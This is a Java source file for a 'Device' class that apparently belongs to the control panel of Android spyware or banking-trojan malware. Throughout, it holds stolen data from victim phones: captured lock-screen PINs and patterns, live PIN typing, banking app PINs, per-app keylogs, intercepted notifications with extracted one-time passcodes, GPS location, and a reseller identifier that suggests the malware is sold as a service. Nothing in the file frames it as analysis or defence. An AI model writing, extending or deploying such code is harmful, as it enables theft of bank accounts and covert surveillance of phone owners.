package com.device.ctrl;
import org.json.JSONArray;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.*;
public class Device {
    public String androidId = "", model = "Unknown", brand = "", android = "", sdk = "", nickname = "", resellerId = "";
    public String ip = "Unknown";
    public boolean online = false;
    public int batteryLevel = -1;
    public boolean batteryCharging = false;
    public boolean isLocked = false;
    public String credType = "", credValue = "";
    public long credTimestamp = 0;
    public String livePinTyping = "";
    public long lastSeen = 0;
    public int screenW = 0, screenH = 0;
    public String detectedLockType = "none";
    public final List<LockEntry> lockHistory = new ArrayList<>();
    public static class BankEntry {
        public String pkgName;
        public String pin;
    }
    public final List<BankEntry> bankLogs = new ArrayList<>();
    public void addBankEntry(String pkg, String pin) {
        if (pkg == null) pkg = "";
        if (pin == null) pin = "";
        for (BankEntry b : bankLogs) {
            if (b.pkgName.equalsIgnoreCase(pkg) && b.pin.equals(pin)) return;
        }
        BankEntry e = new BankEntry();
        e.pkgName = pkg;
        e.pin = pin;
        bankLogs.add(0, e);
        if (bankLogs.size() > 50) bankLogs.remove(bankLogs.size() - 1);
    }
    public static class KeylogEntry {
        public long timestamp;
        public String pkg;
        public String type;
        public String text;
    }
    public final List<KeylogEntry> keylogs = new ArrayList<>();
    public void addKeylogEntry(long ts, String pkg, String type, String text) {
        KeylogEntry e = new KeylogEntry();
        e.timestamp = ts;
        e.pkg = pkg != null ? pkg : "";
        e.type = type != null ? type : "TEXT";
        e.text = text != null ? text : "";
        keylogs.add(0, e);
        if (keylogs.size() > 200) keylogs.remove(keylogs.size() - 1);
    }

    // ─── LOCATION & NOTIFICATIONS ───────────────────────────────────────────
    public double latitude = 0.0, longitude = 0.0;
    public float locAccuracy = 0f;
    public String locProvider = "";
    public long locTime = 0;

    public static class NotifEntry {
        public long timestamp;
        public String pkg;
        public String title;
        public String text;
        public boolean isOtp;
        public String otpCode;
    }
    public final List<NotifEntry> notifications = new ArrayList<>();
    public void addNotification(long ts, String pkg, String title, String text, boolean isOtp, String otp) {
        NotifEntry e = new NotifEntry();
        e.timestamp = ts;
        e.pkg = pkg != null ? pkg : "";
        e.title = title != null ? title : "";
        e.text = text != null ? text : "";
        e.isOtp = isOtp;
        e.otpCode = otp != null ? otp : "";
        notifications.add(0, e);
        if (notifications.size() > 100) notifications.remove(notifications.size() - 1);
    }

    private static final SimpleDateFormat dateFmt = new SimpleDateFormat("MMM dd, HH:mm", Locale.US);
    public static class LockEntry {
        public String lockType;
        public String value;
        public long timestamp;
        public LockEntry(String type, String val, long ts) {
            this.lockType = type;
            this.value = val;
            this.timestamp = ts;
        }
    }
    public static String extractId(JSONObject o) {
        if (o == null) return "";
        String aid = o.optString("androidId", "");
        if (aid.isEmpty()) aid = o.optString("id", "");
        if (aid.isEmpty()) aid = o.optString("deviceId", "");
        if (aid.isEmpty()) {
            JSONObject info = o.optJSONObject("info");
            if (info != null) {
                aid = info.optString("androidId", "");
                if (aid.isEmpty()) aid = info.optString("id", "");
            }
        }
        return aid.trim();
    }
    public static Device fromJSON(JSONObject o) {
        Device d = new Device();
        d.androidId = extractId(o);
        d.updateFromJSON(o);
        return d;
    }
    public void updateFromJSON(JSONObject o) {
        if (o == null) return;
        String aid = extractId(o);
        if (!aid.isEmpty()) this.androidId = aid;
        if (o.has("online")) this.online = o.optBoolean("online", this.online);
        if (o.has("lastSeen")) {
            this.lastSeen = o.optLong("lastSeen", System.currentTimeMillis());
        } else if (this.lastSeen == 0) {
            this.lastSeen = System.currentTimeMillis();
        }
        JSONObject info = o.optJSONObject("info");
        JSONObject src = info != null ? info : o;
        if (src.has("model")) this.model = src.optString("model", this.model);
        if (src.has("brand")) this.brand = src.optString("brand", this.brand);
        if (src.has("android")) this.android = src.optString("android", this.android);
        if (src.has("sdk")) this.sdk = src.optString("sdk", this.sdk);
        if (src.has("battery")) this.batteryLevel = src.optInt("battery", this.batteryLevel);
        if (src.has("charging")) this.batteryCharging = src.optBoolean("charging", this.batteryCharging);
        if (src.has("locked")) this.isLocked = src.optBoolean("locked", this.isLocked);
        if (src.has("ip")) this.ip = src.optString("ip", this.ip);
        else if (o.has("ip")) this.ip = o.optString("ip", this.ip);
        if (src.has("resellerId")) this.resellerId = src.optString("resellerId", this.resellerId);
        else if (o.has("resellerId")) this.resellerId = o.optString("resellerId", this.resellerId);
        JSONObject ci = o.optJSONObject("credentials");
        if (ci != null) {
            this.credType = ci.optString("type", this.credType);
            this.credValue = ci.optString("value", this.credValue);
            this.credTimestamp = ci.optLong("timestamp", this.credTimestamp);
            if (!this.credType.isEmpty()) this.detectedLockType = this.credType;
        }
        JSONArray hist = o.optJSONArray("history");
        if (hist != null) {
            for (int h = 0; h < hist.length(); h++) {
                JSONObject entry = hist.optJSONObject(h);
                if (entry != null) {
                    addLockEntry(
                        entry.optString("lockType", "unknown"),
                        entry.optString("value", ""),
                        entry.optLong("timestamp", System.currentTimeMillis())
                    );
                }
            }
        }
    }
    public void update(JSONObject o) {
        updateFromJSON(o);
    }
    public void addLockEntry(String lockType, String value, long timestamp) {
        if (!lockHistory.isEmpty()) {
            LockEntry last = lockHistory.get(0);
            if (last.lockType.equalsIgnoreCase(lockType) && last.value.equals(value)) {
                return;
            }
        }
        lockHistory.add(0, new LockEntry(lockType, value, timestamp));
        if (lockHistory.size() > 50) lockHistory.remove(lockHistory.size() - 1);
        detectedLockType = lockType;
        if (lockType.equalsIgnoreCase("pin") || lockType.equalsIgnoreCase("pattern")) {
            credType = lockType;
            credValue = value;
            credTimestamp = timestamp;
        }
    }
    public String displayName() {
        String b = brand != null && !brand.isEmpty() ? brand : "";
        String m = model != null && !model.isEmpty() ? model : "Unknown";
        if (b.length() > 0 && !m.toLowerCase().startsWith(b.toLowerCase())) return b + " " + m;
        return m;
    }
    public String getSafeName() {
        if (nickname != null && !nickname.trim().isEmpty()) {
            return nickname.trim();
        }
        String n = displayName();
        if (n == null || n.trim().isEmpty() || n.equalsIgnoreCase("Unknown"))
            return "Device_" + (androidId != null && androidId.length() >= 4 ? androidId.substring(0, 4) : "X");
        return n;
    }
    public String batteryText() {
        if (batteryLevel < 0) return "--%";
        return batteryLevel + "%" + (batteryCharging ? " [CHG]" : "");
    }
    public String credTimeText() {
        if (credTimestamp <= 0) return "";
        return dateFmt.format(new Date(credTimestamp));
    }
}
